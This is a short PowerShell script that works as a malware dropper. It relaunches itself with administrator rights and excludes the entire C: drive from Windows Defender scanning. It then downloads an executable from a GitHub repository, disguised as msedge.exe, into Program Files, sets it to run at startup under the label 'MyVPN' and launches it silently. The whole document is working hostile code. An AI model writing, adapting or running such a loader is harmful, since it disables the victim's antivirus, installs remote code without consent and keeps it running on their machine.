if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }

# Define the paths
$driveToExclude = "C:\"
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$downloadPath = "C:\Program Files\msedge.exe"
$autoStartName = "MyVPN"

# Ensure the script is running as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    exit
}

# Check if Defender is enabled before trying to add exclusion
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue

if ($defenderStatus -and $defenderStatus.AMServiceEnabled) {
    try {
        Add-MpPreference -ExclusionPath $driveToExclude -ErrorAction Stop
    } catch {
        # Skip if fails
    }
}

# Download the executable
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
} catch {
    exit
}

# Add to auto-start
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`"" -ErrorAction Stop
} catch {
    # Skip if fails
}

# Launch the executable silently
try {
    Start-Process -FilePath $downloadPath -ArgumentList "/silent" -Verb RunAs -Wait
} catch {
    # Skip if fails
}
